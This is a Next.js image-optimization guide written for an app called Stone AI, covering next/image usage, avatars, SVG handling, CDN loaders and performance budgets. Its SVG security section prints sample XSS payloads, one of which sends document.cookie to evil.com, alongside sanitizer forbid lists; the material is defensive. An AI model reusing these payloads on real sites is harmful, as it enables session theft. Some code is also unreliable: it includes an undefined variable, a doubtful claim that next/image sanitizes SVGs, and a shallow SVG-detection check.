# Image Optimization in Next.js — Deep Knowledge Seed

## Overview

Images are the biggest performance bottleneck on most web apps. Unoptimized images can add megabytes to page load. This seed covers the `next/image` component in depth, responsive image sizing, blur placeholders, remote image configuration, SVG security (critical for Stone AI), lazy loading, the Stone AI avatar system, CDN integration, format selection, and performance budgets. Every pattern includes TypeScript code with Tailwind styling.

---

## Table of Contents

1. [next/image Deep Dive](#nextimage-deep-dive)
2. [Image Sizing: fill, responsive, fixed](#image-sizing)
3. [Blur Placeholder Generation](#blur-placeholder-generation)
4. [Remote Image Configuration](#remote-image-configuration)
5. [SVG Handling and Security](#svg-handling-and-security)
6. [Lazy Loading and Priority](#lazy-loading-and-priority)
7. [Avatar System Patterns](#avatar-system-patterns)
8. [Image CDN Integration](#image-cdn-integration)
9. [Format Selection (WebP/AVIF)](#format-selection)
10. [Performance Budgets](#performance-budgets)
11. [Complete Examples](#complete-examples)

---

## next/image Deep Dive

### Why next/image Over Regular img

```
Regular <img>:
  ─ No automatic optimization
  ─ No lazy loading (unless you add it)
  ─ No responsive srcset generation
  ─ No format conversion (stuck with original format)
  ─ Layout shift (CLS) if width/height not specified

next/image:
  ✅ Automatic WebP/AVIF conversion
  ✅ Responsive srcset generation
  ✅ Lazy loading by default
  ✅ Zero CLS (reserves space with width/height)
  ✅ On-demand optimization (only optimizes requested sizes)
  ✅ Caching with Content-Addressable headers
  ✅ Blur placeholder support
```

### Basic Usage

```tsx
import Image from 'next/image';

// Local image (imported)
import heroImage from '@/public/images/hero.png';

export function Hero() {
  return (
    <Image
      src={heroImage}
      alt="Stone AI hero image"
      // width and height are automatically inferred from import
      // blurDataURL is automatically generated for local images
      placeholder="blur"
      priority // Above the fold — disable lazy loading
      className="rounded-2xl"
    />
  );
}
```

### Key Props

```typescript
interface NextImageProps {
  src: string | StaticImport;    // URL or imported image
  alt: string;                   // REQUIRED — accessibility
  width?: number;                // Rendered width in pixels
  height?: number;               // Rendered height in pixels
  fill?: boolean;                // Fill parent container (no width/height needed)
  sizes?: string;                // Responsive breakpoint hints
  quality?: number;              // 1-100, default 75
  priority?: boolean;            // Disable lazy loading, preload
  placeholder?: 'blur' | 'empty' | `data:image/${string}`;
  blurDataURL?: string;          // Custom blur placeholder (base64)
  loading?: 'lazy' | 'eager';   // Override lazy loading
  className?: string;            // Applied to the <img> element
  style?: React.CSSProperties;
  onLoad?: () => void;
  onError?: () => void;
}
```

---

## Image Sizing

### fill — Container-Relative Sizing

Use `fill` when the image should fill its parent container. The parent must have `position: relative`.

```tsx
// Hero banner: fills width, maintains aspect ratio
export function HeroBanner({ src }: { src: string }) {
  return (
    <div className="relative w-full aspect-[21/9] rounded-2xl overflow-hidden">
      <Image
        src={src}
        alt="Banner"
        fill
        sizes="100vw"
        className="object-cover"
        priority
      />
    </div>
  );
}

// Card thumbnail: square crop
export function CardThumbnail({ src, alt }: { src: string; alt: string }) {
  return (
    <div className="relative w-full aspect-square rounded-xl overflow-hidden
                    bg-gray-100 dark:bg-gray-800">
      <Image
        src={src}
        alt={alt}
        fill
        sizes="(max-width: 640px) 50vw, (max-width: 1024px) 33vw, 25vw"
        className="object-cover"
      />
    </div>
  );
}

// Background image: fills entire section
export function BackgroundSection({
  src,
  children,
}: {
  src: string;
  children: React.ReactNode;
}) {
  return (
    <section className="relative min-h-[400px] flex items-center">
      <Image
        src={src}
        alt=""
        fill
        sizes="100vw"
        className="object-cover"
        quality={60}
      />
      {/* Overlay */}
      <div className="absolute inset-0 bg-black/50" />
      {/* Content */}
      <div className="relative z-10 max-w-4xl mx-auto px-6 text-white">
        {children}
      </div>
    </section>
  );
}
```

### Responsive — Width/Height with Fluid CSS

```tsx
// Image that scales with its container but has known aspect ratio
export function BlogImage({ src, alt }: { src: string; alt: string }) {
  return (
    <Image
      src={src}
      alt={alt}
      width={1200}
      height={630}
      sizes="(max-width: 640px) 100vw,
             (max-width: 1024px) 80vw,
             800px"
      className="w-full h-auto rounded-lg"
      // w-full makes it fluid, h-auto preserves aspect ratio
    />
  );
}
```

### Fixed — Exact Pixel Dimensions

```tsx
// Logo: always 32x32
export function AppLogo() {
  return (
    <Image
      src="/images/logo.png"
      alt="Stone AI"
      width={32}
      height={32}
      className="flex-shrink-0"
    />
  );
}

// Icon: small fixed size
export function TierIcon({ tier }: { tier: string }) {
  return (
    <Image
      src={`/images/tiers/${tier.toLowerCase()}.png`}
      alt={`${tier} tier`}
      width={20}
      height={20}
    />
  );
}
```

### The `sizes` Prop — Critical for Performance

```tsx
/**
 * `sizes` tells the browser how wide the image will be at each viewport size.
 * Without it, Next.js generates srcsets for all configured widths.
 * With it, the browser picks the optimal size BEFORE downloading.
 *
 * Format: media condition + width
 * Evaluated left to right, first match wins.
 */

// Agent card grid: 1 col mobile, 2 col tablet, 3 col desktop
<Image
  src={agent.avatar}
  alt={agent.name}
  fill
  sizes="(max-width: 640px) 100vw,
         (max-width: 1024px) 50vw,
         33vw"
/>

// Full-width hero
<Image src={hero} alt="" fill sizes="100vw" />

// Sidebar thumbnail (always ~64px)
<Image src={thumb} alt="" width={64} height={64} sizes="64px" />

// Chat avatar (always 40px)
<Image src={avatar} alt="" width={40} height={40} sizes="40px" />
```

---

## Blur Placeholder Generation

### Automatic for Local Images

```tsx
import heroImage from '@/public/images/hero.png';

// blurDataURL is AUTOMATICALLY generated for static imports
<Image
  src={heroImage}
  alt="Hero"
  placeholder="blur"
  // No blurDataURL needed — Next.js generates it at build time
/>
```

### Manual for Remote Images

```tsx
// For remote images, you must provide blurDataURL yourself

// Option 1: Tiny base64 thumbnail stored in database
<Image
  src={agent.avatarUrl}
  alt={agent.name}
  width={400}
  height={400}
  placeholder="blur"
  blurDataURL={agent.blurDataUrl} // e.g., "data:image/jpeg;base64,/9j/4AAQ..."
/>

// Option 2: Simple CSS-based placeholder
<Image
  src={agent.avatarUrl}
  alt={agent.name}
  width={400}
  height={400}
  placeholder="blur"
  blurDataURL="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNDAwIiBoZWlnaHQ9IjQwMCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSIjZTVlN2ViIi8+PC9zdmc+"
/>
```

### Generate Blur Hashes Server-Side

```typescript
// src/lib/image-utils.ts
import { getPlaiceholder } from 'plaiceholder';

/**
 * Generate a blur placeholder for a remote image.
 * Call this when storing images in the database.
 */
export async function generateBlurPlaceholder(imageUrl: string): Promise<string> {
  try {
    const response = await fetch(imageUrl);
    const buffer = Buffer.from(await response.arrayBuffer());
    const { base64 } = await getPlaiceholder(buffer, { size: 10 });
    return base64;
  } catch {
    // Return a simple gray placeholder on failure
    return 'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAiIGhlaWdodD0iMTAiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iI2U1ZTdlYiIvPjwvc3ZnPg==';
  }
}

// Usage in an API route when saving an image:
export async function POST(request: Request) {
  const { imageUrl } = await request.json();

  const blurDataUrl = await generateBlurPlaceholder(imageUrl);

  await prisma.agent.update({
    where: { id: agentId },
    data: {
      avatarUrl: imageUrl,
      blurDataUrl,
    },
  });
}
```

### Shimmer Placeholder (No blurDataURL Needed)

```tsx
// src/components/ui/shimmer-image.tsx
'use client';

import Image from 'next/image';
import { useState } from 'react';

interface ShimmerImageProps {
  src: string;
  alt: string;
  width?: number;
  height?: number;
  fill?: boolean;
  sizes?: string;
  className?: string;
  priority?: boolean;
}

export function ShimmerImage({
  src,
  alt,
  className = '',
  ...props
}: ShimmerImageProps) {
  const [isLoaded, setIsLoaded] = useState(false);

  return (
    <div className="relative overflow-hidden">
      {/* Shimmer shown while image loads */}
      {!isLoaded && (
        <div className="absolute inset-0 bg-gray-200 dark:bg-gray-800 animate-pulse" />
      )}

      <Image
        src={src}
        alt={alt}
        className={`transition-opacity duration-300
          ${isLoaded ? 'opacity-100' : 'opacity-0'} ${className}`}
        onLoad={() => setIsLoaded(true)}
        {...props}
      />
    </div>
  );
}
```

---

## Remote Image Configuration

### next.config.ts

```typescript
// next.config.ts
import type { NextConfig } from 'next';

const nextConfig: NextConfig = {
  images: {
    // Remote image patterns (Next.js 14+)
    remotePatterns: [
      {
        protocol: 'https',
        hostname: 'img.clerk.com',
        // Clerk user avatars
      },
      {
        protocol: 'https',
        hostname: '*.cloudflare.com',
        // Cloudflare CDN
      },
      {
        protocol: 'https',
        hostname: 'images.unsplash.com',
        // Unsplash for stock images
      },
      {
        protocol: 'https',
        hostname: 'stone-ai.net',
        pathname: '/images/**',
        // Our own domain images
      },
    ],

    // Allowed image sizes for srcset generation
    deviceSizes: [640, 750, 828, 1080, 1200, 1920, 2048, 3840],
    imageSizes: [16, 32, 48, 64, 96, 128, 256, 384],

    // Default format and quality
    formats: ['image/avif', 'image/webp'],

    // Minimum cache TTL (seconds) — how long optimized images are cached
    minimumCacheTTL: 60 * 60 * 24 * 30, // 30 days

    // Disable optimization for specific paths (e.g., SVGs)
    dangerouslyAllowSVG: false, // NEVER enable this — XSS risk
    contentDispositionType: 'attachment',
    contentSecurityPolicy: "default-src 'self'; script-src 'none'; sandbox;",
  },
};

export default nextConfig;
```

### Dynamic Remote Patterns

```typescript
// For user-uploaded images from unknown domains, use a proxy:
// DO NOT add wildcards like hostname: '**' — that's a security risk.

// Instead, proxy through your own API:
// src/app/api/image-proxy/route.ts
import { NextRequest, NextResponse } from 'next/server';

const ALLOWED_DOMAINS = new Set([
  'img.clerk.com',
  'images.unsplash.com',
  'lh3.googleusercontent.com',
]);

export async function GET(request: NextRequest) {
  const url = request.nextUrl.searchParams.get('url');
  if (!url) {
    return NextResponse.json({ error: 'Missing url' }, { status: 400 });
  }

  try {
    const parsed = new URL(url);
    if (!ALLOWED_DOMAINS.has(parsed.hostname)) {
      return NextResponse.json({ error: 'Domain not allowed' }, { status: 403 });
    }

    const response = await fetch(url);
    const contentType = response.headers.get('content-type');

    if (!contentType?.startsWith('image/')) {
      return NextResponse.json({ error: 'Not an image' }, { status: 400 });
    }

    const buffer = await response.arrayBuffer();

    return new NextResponse(buffer, {
      headers: {
        'Content-Type': contentType,
        'Cache-Control': 'public, max-age=86400, immutable',
      },
    });
  } catch {
    return NextResponse.json({ error: 'Failed to fetch' }, { status: 500 });
  }
}
```

---

## SVG Handling and Security

### The SVG XSS Threat

SVGs can contain JavaScript. If you render a user-supplied SVG, it can execute arbitrary code in the user's browser.

```xml
<!-- MALICIOUS SVG — executes JavaScript -->
<svg xmlns="http://www.w3.org/2000/svg">
  <script>document.location='https://evil.com/?cookie='+document.cookie</script>
</svg>

<!-- MALICIOUS SVG — onload event -->
<svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS')">
  <rect width="100" height="100" />
</svg>

<!-- MALICIOUS SVG — foreignObject with embedded HTML -->
<svg xmlns="http://www.w3.org/2000/svg">
  <foreignObject>
    <body xmlns="http://www.w3.org/1999/xhtml">
      <script>alert('XSS')</script>
    </body>
  </foreignObject>
</svg>
```

### Stone AI SVG Security Rules

```typescript
// RULE 1: NEVER use dangerouslyAllowSVG in next.config.ts
// RULE 2: NEVER render user-supplied SVGs with dangerouslySetInnerHTML
// RULE 3: NEVER allow SVG data URIs in user avatars
// RULE 4: Only allow png, jpeg, webp, gif for user uploads
// RULE 5: SVG avatars for agents are INTERNAL ONLY (created by us)

// src/lib/validators/avatar.ts
import { z } from 'zod';

const ALLOWED_MIME_TYPES = ['image/png', 'image/jpeg', 'image/webp', 'image/gif'];
const MAX_AVATAR_SIZE = 2 * 1024 * 1024; // 2MB

// For user-uploaded avatars (profile pictures)
export const AvatarUploadSchema = z.object({
  file: z.instanceof(File).refine(
    (file) => ALLOWED_MIME_TYPES.includes(file.type),
    'Only PNG, JPEG, WebP, and GIF images are allowed'
  ).refine(
    (file) => file.size <= MAX_AVATAR_SIZE,
    'Image must be under 2MB'
  ),
}).strict();

// For base64 avatar data URIs
export const AvatarDataUriSchema = z.string().refine(
  (uri) => {
    // Only allow specific image types — NO SVG
    const validPrefixes = [
      'data:image/png;base64,',
      'data:image/jpeg;base64,',
      'data:image/webp;base64,',
      'data:image/gif;base64,',
    ];
    return validPrefixes.some((prefix) => uri.startsWith(prefix));
  },
  'Invalid image format. SVG and other formats are not allowed.'
);
```

### Safe SVG Rendering for Internal Icons

```tsx
// For our own SVG icons/avatars (NOT user-supplied):

// Option 1: Import as React component (safest)
import { ReactComponent as AgentIcon } from '@/public/icons/agent.svg';
// or use next/image which sanitizes SVGs by default

// Option 2: Inline SVG in JSX (safe — it's our code)
export function StoneAILogo({ className }: { className?: string }) {
  return (
    <svg
      className={className}
      viewBox="0 0 24 24"
      fill="none"
      xmlns="http://www.w3.org/2000/svg"
    >
      <path d="M12 2L2 7l10 5 10-5-10-5z" fill="currentColor" />
      <path d="M2 17l10 5 10-5" stroke="currentColor" strokeWidth="2" />
    </svg>
  );
}

// Option 3: next/image with SVG (renders as <img> — scripts can't execute)
import Image from 'next/image';

export function SafeSvgImage({ src, alt }: { src: string; alt: string }) {
  return (
    <Image
      src={src}
      alt={alt}
      width={24}
      height={24}
      // next/image renders SVGs as <img> tags, NOT inline SVG
      // Scripts inside the SVG CAN'T execute when loaded as <img>
    />
  );
}
```

### SVG Sanitization (If You Must Accept SVGs)

```typescript
// src/lib/svg-sanitizer.ts
import DOMPurify from 'isomorphic-dompurify';

/**
 * Sanitize an SVG string, removing all potentially dangerous elements.
 * USE SPARINGLY — prefer not accepting SVGs from users at all.
 */
export function sanitizeSvg(svgString: string): string {
  return DOMPurify.sanitize(svgString, {
    USE_PROFILES: { svg: true, svgFilters: true },
    // Remove all scripts, event handlers, and dangerous elements
    FORBID_TAGS: ['script', 'foreignObject', 'set', 'animate'],
    FORBID_ATTR: [
      'onload', 'onerror', 'onclick', 'onmouseover',
      'onfocus', 'onblur', 'xlink:href',
    ],
  });
}

// IMPORTANT: Even with sanitization, SVG from users is risky.
// Stone AI policy: NO user-supplied SVGs. Period.
```

---

## Lazy Loading and Priority

### Default Behavior

```tsx
// next/image is lazy-loaded by default
// Images below the fold load when they enter the viewport

<Image src="/photo.jpg" alt="" width={800} height={600} />
// loading="lazy" is the default — no need to specify
```

### Priority Images (Above the Fold)

```tsx
// Mark images that are visible on initial page load as priority
// This disables lazy loading AND adds a <link rel="preload">

// Hero images
<Image src={hero} alt="" fill priority />

// Logo in header
<Image src="/logo.png" alt="Stone AI" width={32} height={32} priority />

// First agent card avatar (if it's above the fold)
<Image src={agents[0].avatar} alt="" width={48} height={48} priority />

// Rule of thumb: Only 1-2 images per page should be priority
// Too many priority images hurt performance (everything preloads)
```

### Lazy Loading Strategies

```tsx
// Strategy 1: Default lazy loading (most images)
<Image src={src} alt="" width={400} height={300} />

// Strategy 2: Priority for above-the-fold
<Image src={src} alt="" width={400} height={300} priority />

// Strategy 3: Eager loading for important but not preloaded
<Image src={src} alt="" width={400} height={300} loading="eager" />

// Strategy 4: Intersection Observer for custom behavior
'use client';

import { useRef, useState, useEffect } from 'react';
import Image from 'next/image';

export function LazyImage({ src, alt }: { src: string; alt: string }) {
  const ref = useRef<HTMLDivElement>(null);
  const [isVisible, setIsVisible] = useState(false);

  useEffect(() => {
    const observer = new IntersectionObserver(
      ([entry]) => {
        if (entry.isIntersecting) {
          setIsVisible(true);
          observer.disconnect();
        }
      },
      { rootMargin: '200px' } // Start loading 200px before visible
    );

    if (ref.current) observer.observe(ref.current);
    return () => observer.disconnect();
  }, []);

  return (
    <div ref={ref} className="relative aspect-video">
      {isVisible ? (
        <Image src={src} alt={alt} fill className="object-cover" />
      ) : (
        <div className="absolute inset-0 bg-gray-200 dark:bg-gray-800 animate-pulse" />
      )}
    </div>
  );
}
```

---

## Avatar System Patterns

Stone AI uses base64 data URIs for avatars. This avoids external image hosting for user-generated content.

### Avatar Component

```tsx
// src/components/ui/avatar.tsx
'use client';

import Image from 'next/image';
import { useState } from 'react';

interface AvatarProps {
  src: string | null | undefined;
  alt: string;
  size?: 'xs' | 'sm' | 'md' | 'lg' | 'xl';
  className?: string;
}

const sizeMap = {
  xs: { px: 24, classes: 'w-6 h-6 text-[10px]' },
  sm: { px: 32, classes: 'w-8 h-8 text-xs' },
  md: { px: 40, classes: 'w-10 h-10 text-sm' },
  lg: { px: 56, classes: 'w-14 h-14 text-base' },
  xl: { px: 80, classes: 'w-20 h-20 text-xl' },
} as const;

export function Avatar({ src, alt, size = 'md', className = '' }: AvatarProps) {
  const [hasError, setHasError] = useState(false);
  const { px, classes } = sizeMap[size];

  // Show initials fallback if no image or image fails to load
  if (!src || hasError) {
    const initials = alt
      .split(' ')
      .map((word) => word[0])
      .join('')
      .toUpperCase()
      .slice(0, 2);

    return (
      <div
        className={`rounded-full bg-gradient-to-br from-blue-500 to-purple-600
                    flex items-center justify-center font-semibold text-white
                    flex-shrink-0 ${classes} ${className}`}
        role="img"
        aria-label={alt}
      >
        {initials || '?'}
      </div>
    );
  }

  // Base64 data URI: use regular <img> (next/image doesn't optimize data URIs)
  if (src.startsWith('data:image/')) {
    return (
      <img
        src={src}
        alt={alt}
        width={px}
        height={px}
        className={`rounded-full object-cover flex-shrink-0 ${classes} ${className}`}
        onError={() => setHasError(true)}
      />
    );
  }

  // Remote URL: use next/image for optimization
  return (
    <Image
      src={src}
      alt={alt}
      width={px}
      height={px}
      sizes={`${px}px`}
      className={`rounded-full object-cover flex-shrink-0 ${classes} ${className}`}
      onError={() => setHasError(true)}
    />
  );
}
```

### Avatar Upload and Validation

```typescript
// src/app/api/user/avatar/route.ts
import { NextRequest, NextResponse } from 'next/server';
import { auth } from '@clerk/nextjs/server';
import { z } from 'zod';

const ALLOWED_TYPES = ['image/png', 'image/jpeg', 'image/webp', 'image/gif'];
const MAX_SIZE = 2 * 1024 * 1024; // 2MB
const MAX_DIMENSION = 512; // Max 512x512

const AvatarSchema = z.object({
  avatar: z.string().refine((uri) => {
    // Must be a data URI with allowed type
    const match = uri.match(/^data:image\/(png|jpeg|webp|gif);base64,/);
    if (!match) return false;

    // Check base64 size (rough estimate: base64 is ~33% larger)
    const base64Part = uri.split(',')[1];
    if (!base64Part) return false;

    const estimatedSize = (base64Part.length * 3) / 4;
    return estimatedSize <= MAX_SIZE;
  }, 'Invalid avatar. Must be PNG, JPEG, WebP, or GIF under 2MB.'),
}).strict();

export async function PUT(request: NextRequest) {
  const { userId } = await auth();
  if (!userId) {
    return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
  }

  const body = await request.json();
  const parsed = AvatarSchema.safeParse(body);

  if (!parsed.success) {
    return NextResponse.json(
      { error: parsed.error.issues[0].message },
      { status: 400 }
    );
  }

  // SECURITY: Verify the data URI doesn't contain SVG
  // (even if someone tricks the MIME type)
  const base64Data = parsed.data.avatar.split(',')[1];
  const binaryHeader = atob(base64Data.slice(0, 20));

  if (binaryHeader.includes('<svg') || binaryHeader.includes('<?xml')) {
    return NextResponse.json(
      { error: 'SVG images are not allowed' },
      { status: 400 }
    );
  }

  await prisma.user.update({
    where: { clerkId: userId },
    data: { avatar: parsed.data.avatar },
  });

  return NextResponse.json({ success: true });
}
```

### Agent SVG Avatars (Internal Only)

```tsx
// src/components/agents/agent-avatar.tsx
// Agent avatars are SVG-based but CREATED BY US, not user-supplied

interface AgentAvatarProps {
  agent: {
    id: string;
    name: string;
    avatar: string; // SVG string or data URI
    color: string;  // Primary color
  };
  size?: 'sm' | 'md' | 'lg';
}

const agentSizeMap = {
  sm: 'w-8 h-8',
  md: 'w-12 h-12',
  lg: 'w-16 h-16',
} as const;

export function AgentAvatar({ agent, size = 'md' }: AgentAvatarProps) {
  // Agent avatars are stored as base64 data URIs (SVG pre-rendered to PNG)
  // We NEVER render raw SVG from database — always PNG/WebP data URIs
  if (agent.avatar.startsWith('data:image/png') ||
      agent.avatar.startsWith('data:image/webp')) {
    return (
      <img
        src={agent.avatar}
        alt={agent.name}
        className={`rounded-xl object-cover ${agentSizeMap[size]}`}
      />
    );
  }

  // Fallback: colored circle with initial
  return (
    <div
      className={`rounded-xl flex items-center justify-center
                  font-bold text-white ${agentSizeMap[size]}`}
      style={{ backgroundColor: agent.color }}
    >
      {agent.name[0]}
    </div>
  );
}
```

---

## Image CDN Integration

### Vercel Image Optimization

```typescript
// When deployed to Vercel, next/image uses Vercel's Image Optimization API.
// No configuration needed — it's automatic.

// How it works:
// 1. Browser requests /_next/image?url=...&w=640&q=75
// 2. Vercel fetches the original image
// 3. Resizes, compresses, converts to WebP/AVIF
// 4. Returns optimized image with CDN cache headers
// 5. Subsequent requests served from CDN edge cache

// Cache behavior:
// - Optimized images cached at CDN edge for minimumCacheTTL
// - Default: 60 seconds (too low for most apps)
// - Recommended: 30 days for static images
// - Set in next.config.ts: minimumCacheTTL: 2592000
```

### Custom Image Loader

```typescript
// next.config.ts
const nextConfig: NextConfig = {
  images: {
    loader: 'custom',
    loaderFile: './src/lib/image-loader.ts',
  },
};

// src/lib/image-loader.ts
interface ImageLoaderParams {
  src: string;
  width: number;
  quality?: number;
}

export default function cloudflareLoader({
  src,
  width,
  quality,
}: ImageLoaderParams): string {
  // Cloudflare Image Resizing
  const params = [`width=${width}`, `quality=${quality || 75}`, 'format=auto'];
  return `https://stone-ai.net/cdn-cgi/image/${params.join(',')}/${src}`;
}
```

### Image Preloading for Critical Paths

```tsx
// src/app/layout.tsx
import { headers } from 'next/headers';

export default async function RootLayout({ children }: { children: React.ReactNode }) {
  return (
    <html>
      <head>
        {/* Preload critical images */}
        <link
          rel="preload"
          as="image"
          href="/images/logo.png"
          type="image/png"
        />
        {/* Preconnect to image CDN */}
        <link rel="preconnect" href="https://img.clerk.com" />
        <link rel="dns-prefetch" href="https://img.clerk.com" />
      </head>
      <body>{children}</body>
    </html>
  );
}
```

---

## Format Selection

### WebP vs AVIF

```
WebP:
  ─ 25-35% smaller than JPEG
  ─ Supported by 97%+ browsers (2024+)
  ─ Fast encode/decode
  ─ Good for all image types

AVIF:
  ─ 50%+ smaller than JPEG
  ─ Supported by 93%+ browsers (growing)
  ─ Slower to encode (higher server cost)
  ─ Better quality at low file sizes
  ─ Best for photographic images

Recommendation for Stone AI:
  ─ Prefer AVIF with WebP fallback
  ─ Set formats: ['image/avif', 'image/webp'] in next.config.ts
  ─ Next.js automatically serves AVIF to browsers that support it
  ─ Falls back to WebP for older browsers
```

### Format Configuration

```typescript
// next.config.ts
const nextConfig: NextConfig = {
  images: {
    // Serve AVIF first (smaller), fall back to WebP
    formats: ['image/avif', 'image/webp'],

    // Quality setting affects file size vs visual quality
    // 75 is the default — good balance
    // For avatars/thumbnails: 60-70 is fine (small, don't need perfection)
    // For hero images: 80-85 (visual quality matters)
  },
};
```

### Per-Image Quality Control

```tsx
// Hero: high quality
<Image src={hero} alt="" fill quality={85} priority />

// Thumbnail: lower quality is fine
<Image src={thumb} alt="" width={200} height={200} quality={60} />

// Avatar: medium quality
<Image src={avatar} alt="" width={48} height={48} quality={70} />

// Background (blurred/overlaid): very low quality is fine
<Image src={bg} alt="" fill quality={40} className="object-cover blur-sm" />
```

---

## Performance Budgets

### Image Performance Guidelines

```
Page Type          │ Total Image Weight │ LCP Image │ Image Count
───────────────────┼────────────────────┼───────────┼────────────
Landing page       │ < 500KB            │ < 100KB   │ < 10
Dashboard          │ < 300KB            │ < 50KB    │ < 20
Chat page          │ < 200KB            │ < 30KB    │ < 15 (avatars)
Agent list         │ < 400KB            │ < 50KB    │ < 50
Settings           │ < 100KB            │ N/A       │ < 5
Forum              │ < 500KB            │ < 80KB    │ < 30
```

### Monitoring Image Performance

```typescript
// src/lib/image-performance.ts
'use client';

/**
 * Monitor image loading performance in development.
 * Logs warnings for images that exceed size or time budgets.
 */
export function initImagePerformanceMonitor() {
  if (process.env.NODE_ENV !== 'development') return;

  const observer = new PerformanceObserver((list) => {
    for (const entry of list.getEntries()) {
      if (entry.entryType !== 'resource') continue;
      const resource = entry as PerformanceResourceTiming;

      if (!resource.name.includes('image') && !resource.name.match(/\.(jpg|jpeg|png|webp|avif|gif|svg)/i)) {
        continue;
      }

      const sizeKB = resource.transferSize / 1024;
      const durationMs = resource.duration;

      if (sizeKB > 200) {
        console.warn(
          `[Image Perf] Large image: ${resource.name}\n` +
          `  Size: ${sizeKB.toFixed(1)}KB (budget: 200KB)\n` +
          `  Duration: ${durationMs.toFixed(0)}ms`
        );
      }

      if (durationMs > 2000) {
        console.warn(
          `[Image Perf] Slow image: ${resource.name}\n` +
          `  Duration: ${durationMs.toFixed(0)}ms (budget: 2000ms)\n` +
          `  Size: ${sizeKB.toFixed(1)}KB`
        );
      }
    }
  });

  observer.observe({ type: 'resource', buffered: true });
}
```

### Image Optimization Checklist

```
□ All images use next/image (not <img>)
□ All images have alt text
□ Hero/above-fold images have priority
□ sizes prop set correctly for responsive images
□ quality reduced for thumbnails and backgrounds
□ Remote patterns configured (no wildcards)
□ dangerouslyAllowSVG is false
□ User avatars: only PNG/JPEG/WebP/GIF allowed
□ No SVG data URIs accepted from users
□ Blur placeholders for remote images
□ minimumCacheTTL set to 30 days
□ formats: ['image/avif', 'image/webp']
□ Total page image weight under budget
□ LCP image loads in < 2.5s
□ No layout shift from images (CLS = 0)
```

---

## Complete Examples

### Full Image Gallery Component

```tsx
// src/components/gallery.tsx
'use client';

import Image from 'next/image';
import { useState } from 'react';

interface GalleryImage {
  id: string;
  src: string;
  alt: string;
  width: number;
  height: number;
  blurDataUrl?: string;
}

export function Gallery({ images }: { images: GalleryImage[] }) {
  const [selectedImage, setSelectedImage] = useState<GalleryImage | null>(null);

  return (
    <>
      {/* Grid */}
      <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 gap-2">
        {images.map((image, index) => (
          <button
            key={image.id}
            onClick={() => setSelectedImage(image)}
            className="relative aspect-square rounded-lg overflow-hidden
                       group focus-visible:ring-2 focus-visible:ring-blue-500"
          >
            <Image
              src={image.src}
              alt={image.alt}
              fill
              sizes="(max-width: 640px) 50vw, (max-width: 768px) 33vw, 25vw"
              className="object-cover transition-transform duration-300
                         group-hover:scale-105"
              placeholder={image.blurDataUrl ? 'blur' : 'empty'}
              blurDataURL={image.blurDataUrl}
              priority={index < 4} // First 4 images are priority
            />
          </button>
        ))}
      </div>

      {/* Lightbox */}
      {selectedImage && (
        <div
          className="fixed inset-0 z-50 bg-black/90 flex items-center
                     justify-center p-4"
          onClick={() => setSelectedImage(null)}
        >
          <button
            onClick={() => setSelectedImage(null)}
            className="absolute top-4 right-4 p-2 rounded-full
                       bg-white/10 hover:bg-white/20 text-white"
            aria-label="Close"
          >
            <XIcon className="w-6 h-6" />
          </button>

          <Image
            src={selectedImage.src}
            alt={selectedImage.alt}
            width={selectedImage.width}
            height={selectedImage.height}
            sizes="90vw"
            quality={90}
            className="max-h-[90vh] w-auto rounded-lg"
            priority
          />
        </div>
      )}
    </>
  );
}
```

### Backdrop Image Selector (Stone AI Feature)

```tsx
// src/components/backdrops/backdrop-selector.tsx
'use client';

import Image from 'next/image';
import { useState } from 'react';

interface Backdrop {
  id: string;
  name: string;
  thumbnailUrl: string;
  fullUrl: string;
  isPremium: boolean;
}

export function BackdropSelector({
  backdrops,
  selected,
  onSelect,
  userTier,
}: {
  backdrops: Backdrop[];
  selected: string | null;
  onSelect: (id: string) => void;
  userTier: string;
}) {
  return (
    <div className="grid grid-cols-3 sm:grid-cols-4 md:grid-cols-5 gap-3">
      {backdrops.map((backdrop) => {
        const isLocked = backdrop.isPremium && userTier === 'FREE';
        const isSelected = selected === backdrop.id;

        return (
          <button
            key={backdrop.id}
            onClick={() => !isLocked && onSelect(backdrop.id)}
            disabled={isLocked}
            className={`relative aspect-video rounded-lg overflow-hidden
              transition-all duration-200
              ${isSelected
                ? 'ring-2 ring-blue-500 ring-offset-2 dark:ring-offset-gray-900'
                : 'hover:ring-1 hover:ring-gray-300'
              }
              ${isLocked ? 'opacity-50 cursor-not-allowed' : 'cursor-pointer'}
            `}
          >
            <Image
              src={backdrop.thumbnailUrl}
              alt={backdrop.name}
              fill
              sizes="(max-width: 640px) 33vw, (max-width: 768px) 25vw, 20vw"
              className="object-cover"
              quality={60}
            />

            {/* Premium lock overlay */}
            {isLocked && (
              <div className="absolute inset-0 bg-black/40 flex items-center
                              justify-center">
                <LockIcon className="w-5 h-5 text-white" />
              </div>
            )}

            {/* Selected checkmark */}
            {isSelected && (
              <div className="absolute top-1 right-1 w-5 h-5 rounded-full
                              bg-blue-500 flex items-center justify-center">
                <CheckIcon className="w-3 h-3 text-white" />
              </div>
            )}
          </button>
        );
      })}
    </div>
  );
}
```

---

## Summary

1. **Always use next/image** over `<img>` for automatic optimization, lazy loading, and format conversion.
2. **Use `fill` for responsive containers**, `width/height` for fixed-size images.
3. **Set `sizes` correctly** — it determines which srcset size the browser downloads.
4. **Mark hero/above-fold images as `priority`** — limit to 1-2 per page.
5. **SVGs from users are a security threat** — Stone AI blocks all SVG data URIs. Only PNG, JPEG, WebP, GIF allowed.
6. **Base64 data URIs bypass next/image optimization** — use plain `<img>` for avatars stored as data URIs.
7. **Generate blur placeholders server-side** for remote images using plaiceholder.
8. **AVIF first, WebP fallback** — configure `formats: ['image/avif', 'image/webp']`.
9. **Set `minimumCacheTTL` to 30 days** — default 60 seconds is too aggressive.
10. **Monitor image performance** — stay under budget for total page weight and LCP.
